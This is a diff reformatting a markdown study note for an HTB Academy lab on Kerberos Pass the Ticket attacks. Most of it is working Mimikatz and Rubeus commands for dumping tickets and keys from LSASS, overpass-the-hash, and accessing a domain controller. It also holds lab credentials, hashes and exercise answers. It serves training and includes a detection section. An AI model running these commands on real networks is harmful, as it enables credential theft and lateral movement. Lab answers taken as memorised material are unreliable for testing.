@@ -1,20 +1,22 @@
-# Pass the Ticket (PtT) from Windows
+# 🎫 Pass the Ticket (PtT) Attacks
 
 ## 🎯 Overview
 
 **Pass the Ticket (PtT)** is a lateral movement technique in Active Directory environments that uses stolen **Kerberos tickets** instead of NTLM password hashes. Unlike Pass the Hash attacks, PtT leverages the Kerberos authentication protocol to impersonate users and access resources.
 
 ### Key Concepts
-- **TGT (Ticket Granting Ticket)** - First ticket obtained, used to request additional service tickets
-- **TGS (Ticket Granting Service)** - Service-specific tickets that allow access to particular resources
-- **KDC (Key Distribution Center)** - Domain Controller component that issues tickets
-- **LSASS Process** - Windows service that processes and stores Kerberos tickets
 
----
+* **TGT (Ticket Granting Ticket)** - First ticket obtained, used to request additional service tickets
+* **TGS (Ticket Granting Service)** - Service-specific tickets that allow access to particular resources
+* **KDC (Key Distribution Center)** - Domain Controller component that issues tickets
+* **LSASS Process** - Windows service that processes and stores Kerberos tickets
+
+***
 
 ## 🔧 Kerberos Protocol Refresher
 
 ### Authentication Flow
+
 ```
 1. User → KDC: Authentication Request (encrypted timestamp with password hash)
 2. KDC → User: TGT (if authentication successful)
@@ -24,34 +26,38 @@
 ```
 
 ### Ticket Types
-- **Service Ticket (TGS)** - Access to specific resource/service
-- **Ticket Granting Ticket (TGT)** - Used to request service tickets for any accessible resource
+
+* **Service Ticket (TGS)** - Access to specific resource/service
+* **Ticket Granting Ticket (TGT)** - Used to request service tickets for any accessible resource
 
 **Advantage**: User doesn't need to provide password to every service - tickets handle authentication
 
----
+***
 
 ## 🎯 Attack Prerequisites
 
 ### Required Conditions
-- **Local Administrator** privileges (to access LSASS)
-- **Valid Kerberos tickets** on target system
-- **Domain-joined** Windows machine
-- **LSASS access** for ticket extraction
+
+* **Local Administrator** privileges (to access LSASS)
+* **Valid Kerberos tickets** on target system
+* **Domain-joined** Windows machine
+* **LSASS access** for ticket extraction
 
 ### Ticket Sources
+
 1. **Currently logged-in users** (active sessions)
-2. **Cached tickets** from previous authentications  
+2. **Cached tickets** from previous authentications
 3. **Forged tickets** using extracted keys
 4. **Exported .kirbi files** from previous operations
 
----
+***
 
 ## 🛠️ Harvesting Kerberos Tickets
 
 ### 1. Mimikatz Ticket Export
 
 #### Export All Tickets to .kirbi Files
+
 ```cmd
 # Launch Mimikatz with debug privileges
 mimikatz.exe
@@ -66,6 +72,7 @@ sekurlsa::tickets /export
 ```
 
 #### Ticket Naming Convention
+
 ```bash
 # User tickets
 [randomvalue]-username@service-domain.local.kirbi
@@ -80,6 +87,7 @@ sekurlsa::tickets /export
 ### 2. Rubeus Ticket Export
 
 #### Dump All Tickets (Base64 Format)
+
 ```cmd
 # Export all tickets as Base64 (easier copy-paste)
 Rubeus.exe dump /nowrap
@@ -95,6 +103,7 @@ Base64EncodedTicket  :  doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...
 ### 3. Extract Kerberos Encryption Keys
 
 #### Mimikatz Key Extraction
+
 ```cmd
 mimikatz.exe
 privilege::debug
@@ -109,20 +118,23 @@ rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
 ```
 
 **Key Types Explained:**
-- **aes256_hmac** - Modern AES-256 encryption (preferred)
-- **rc4_hmac_nt** - Legacy RC4/NTLM hash
-- **rc4_hmac_old** - Older RC4 implementation
 
----
+* **aes256\_hmac** - Modern AES-256 encryption (preferred)
+* **rc4\_hmac\_nt** - Legacy RC4/NTLM hash
+* **rc4\_hmac\_old** - Older RC4 implementation
+
+***
 
 ## 🔄 Pass the Key (OverPass the Hash)
 
 ### Concept
+
 **Pass the Key** (aka OverPass the Hash) converts a user's hash/key into a full **Ticket Granting Ticket (TGT)**. This technique bridges hash-based and ticket-based attacks.
 
 ### 1. Mimikatz OverPass the Hash
 
 #### Using NTLM Hash
+
 ```cmd
 mimikatz.exe
 privilege::debug
@@ -137,6 +149,7 @@ sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09c
 ```
 
 #### Process Details
+
 ```cmd
 user    : plaintext
 domain  : inlanefreight.htb  
@@ -149,6 +162,7 @@ LUID    : 0 ; 3414364 (00000000:0034195c)
 ### 2. Rubeus OverPass the Hash
 
 #### Using AES256 Key (Preferred)
+
 ```cmd
 # Request TGT using AES256 key
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
@@ -158,20 +172,22 @@ Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f
 ```
 
 #### Key Advantages
-- **No admin privileges required** (unlike Mimikatz)
-- **Base64 output** for easy manipulation
-- **Multiple encryption types** supported
-- **Stealth operation** - no new processes
+
+* **No admin privileges required** (unlike Mimikatz)
+* **Base64 output** for easy manipulation
+* **Multiple encryption types** supported
+* **Stealth operation** - no new processes
 
 **Security Note**: Using RC4 instead of AES256 may trigger "encryption downgrade" detection in modern domains.
 
----
+***
 
 ## 🎫 Pass the Ticket (PtT) Attacks
 
 ### 1. Rubeus Pass the Ticket
 
 #### Direct Ticket Import with /ptt
+
 ```cmd
 # Request TGT and immediately import to current session
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
@@ -180,6 +196,7 @@ Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f
 ```
 
 #### Import .kirbi File
+
 ```cmd
 # Import ticket from file
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
@@ -189,6 +206,7 @@ dir \\DC01.inlanefreight.htb\c$
 ```
 
 #### Import Base64 Ticket
+
 ```cmd
 # Convert .kirbi to Base64 (PowerShell)
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
@@ -200,6 +218,7 @@ Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...
 ### 2. Mimikatz Pass the Ticket
 
 #### Import .kirbi File
+
 ```cmd
 mimikatz.exe
 privilege::debug
@@ -214,6 +233,7 @@ dir \\DC01.inlanefreight.htb\c$
 ```
 
 #### Launch New CMD with Ticket
+
 ```cmd
 # Import ticket and launch new command prompt
 kerberos::ptt "ticket.kirbi"
@@ -222,22 +242,25 @@ misc::cmd
 # New cmd.exe window opens with imported ticket
 ```
 
----
+***
 
 ## 🔌 PowerShell Remoting with PtT
 
 ### Prerequisites
-- **Remote Management Users** group membership OR
-- **Administrative privileges** on target OR  
-- **Explicit PowerShell Remoting permissions**
+
+* **Remote Management Users** group membership OR
+* **Administrative privileges** on target OR
+* **Explicit PowerShell Remoting permissions**
 
 **Default Ports:**
-- **TCP/5985** - HTTP
-- **TCP/5986** - HTTPS
+
+* **TCP/5985** - HTTP
+* **TCP/5986** - HTTPS
 
 ### 1. Mimikatz + PowerShell Remoting
 
 #### Method 1: Sequential Import
+
 ```cmd
 # Step 1: Import ticket with Mimikatz
 mimikatz.exe
@@ -256,7 +279,8 @@ inlanefreight\john
 
 ### 2. Rubeus + Sacrificial Process
 
-#### Create LOGON_TYPE 9 Process
+#### Create LOGON\_TYPE 9 Process
+
 ```cmd
 # Create sacrificial process (prevents TGT erasure)
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
@@ -268,6 +292,7 @@ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
 
 #### Request TGT in New Process
+
 ```cmd
 # From new cmd window, request and import TGT
 Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
@@ -280,17 +305,19 @@ Enter-PSSession -ComputerName DC01
 inlanefreight\john
 ```
 
----
+***
 
 ## 🎯 HTB Academy Lab Exercises
 
 ### Lab Environment
-- **Target**: 10.129.164.157 (ACADEMY-PWATTACKS-LM-MS01)
-- **Credentials**: Administrator : AnotherC0mpl3xP4$$
-- **Domain**: inlanefreight.htb
-- **DC**: DC01.inlanefreight.htb
+
+* **Target**: 10.129.164.157 (ACADEMY-PWATTACKS-LM-MS01)
+* **Credentials**: Administrator : AnotherC0mpl3xP4\$$
+* **Domain**: inlanefreight.htb
+* **DC**: DC01.inlanefreight.htb
 
 ### Exercise 1: Ticket Collection
+
 **Question**: "Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?"
 
 ```cmd
@@ -316,7 +343,8 @@ dir
 **Answer**: **3** user TGTs (julio, john, david)
 
 ### Exercise 2: John's Share Access
-**Question**: "Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john"
+
+**Question**: "Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \DC01.inlanefreight.htb\john"
 
 ```cmd
 # Import john's TGT with Mimikatz
@@ -333,6 +361,7 @@ type \\DC01.inlanefreight.htb\john\john.txt
 ```
 
 **Expected Output**:
+
 ```cmd
 Directory of \\DC01.inlanefreight.htb\john
 07/14/2022  07:25 AM    <DIR>          .
@@ -342,6 +371,7 @@ Directory of \\DC01.inlanefreight.htb\john
 ```
 
 ### Exercise 3: PowerShell Remoting
+
 **Question**: "Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt"
 
 ```cmd
@@ -364,6 +394,7 @@ cat C:\john\john.txt
 ```
 
 **Expected Session**:
+
 ```powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -376,6 +407,7 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 ### Key Lab Insights
 
 #### Ticket Identification Patterns
+
 ```bash
 # Computer account tickets (ignore for user count)
 *MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
@@ -387,6 +419,7 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 ```
 
 #### Critical Command Sequence
+
 ```cmd
 1. Export: mimikatz "privilege::debug" "sekurlsa::tickets /export" exit
 2. Import: kerberos::ptt "[ticket-path]"
@@ -395,14 +428,17 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 ```
 
 #### Success Indicators
-- **Exercise 1**: Count = 3 (julio, john, david)
-- **Exercise 2**: Successful SMB share access to john folder
-- **Exercise 3**: Remote PowerShell session established as john
+
+* **Exercise 1**: Count = 3 (julio, john, david)
+* **Exercise 2**: Successful SMB share access to john folder
+* **Exercise 3**: Remote PowerShell session established as john
 
 ### Optional: Tool Comparison
+
 **Objective**: Perform attacks using both Mimikatz and Rubeus independently
 
 **Mimikatz-Only Approach:**
+
 ```cmd
 # Export tickets
 mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
@@ -412,6 +448,7 @@ mimikatz.exe "privilege::debug" "kerberos::ptt ticket.kirbi" "exit"
 ```
 
 **Rubeus-Only Approach:**
+
 ```cmd
 # Dump tickets
 Rubeus.exe dump /nowrap
@@ -420,11 +457,12 @@ Rubeus.exe dump /nowrap
 Rubeus.exe ptt /ticket:base64_ticket_data
 ```
 
----
+***
 
 ## 🛡️ Detection and Defense
 
 ### Detection Indicators
+
 ```bash
 # Event Log Monitoring
 # Event ID 4768 - TGT Request
@@ -439,6 +477,7 @@ Rubeus.exe ptt /ticket:base64_ticket_data
 ```
 
 ### Defensive Measures
+
 ```bash
 # Account Security
 ✅ Implement least privilege access
@@ -457,20 +496,22 @@ Rubeus.exe ptt /ticket:base64_ticket_data
 ✅ Implement honeypot accounts
 ```
 
----
+***
 
 ## 🔗 Related Techniques
 
 ### Comparison Matrix
-| Technique | Auth Method | Requirements | Stealth Level |
-|-----------|-------------|--------------|---------------|
-| **Pass the Hash** | NTLM | Admin + Hash | Medium |
-| **Pass the Ticket** | Kerberos | Valid Ticket | High |
-| **Pass the Key** | Kerberos | Key/Hash | High |
-| **Golden Ticket** | Kerberos | krbtgt Hash | Very High |
-| **Silver Ticket** | Kerberos | Service Hash | Very High |
+
+| Technique           | Auth Method | Requirements | Stealth Level |
+| ------------------- | ----------- | ------------ | ------------- |
+| **Pass the Hash**   | NTLM        | Admin + Hash | Medium        |
+| **Pass the Ticket** | Kerberos    | Valid Ticket | High          |
+| **Pass the Key**    | Kerberos    | Key/Hash     | High          |
+| **Golden Ticket**   | Kerberos    | krbtgt Hash  | Very High     |
+| **Silver Ticket**   | Kerberos    | Service Hash | Very High     |
 
 ### Lateral Movement Chain
+
 ```bash
 1. Initial Access → Credential Dumping
 2. Extract NTLM Hash → Pass the Hash
@@ -479,12 +520,12 @@ Rubeus.exe ptt /ticket:base64_ticket_data
 5. Access Target Resources → Further Exploitation
 ```
 
----
+***
 
 ## 📚 References
 
-- **HTB Academy**: Password Attacks Module - Pass the Ticket
-- **Mimikatz Documentation**: Kerberos attacks and ticket manipulation
-- **Rubeus Documentation**: .NET tool for Kerberos abuse
-- **Microsoft**: Kerberos Authentication Technical Reference
-- **NIST**: Guidelines for Kerberos implementations 
+* **HTB Academy**: Password Attacks Module - Pass the Ticket
+* **Mimikatz Documentation**: Kerberos attacks and ticket manipulation
+* **Rubeus Documentation**: .NET tool for Kerberos abuse
+* **Microsoft**: Kerberos Authentication Technical Reference
+* **NIST**: Guidelines for Kerberos implementations
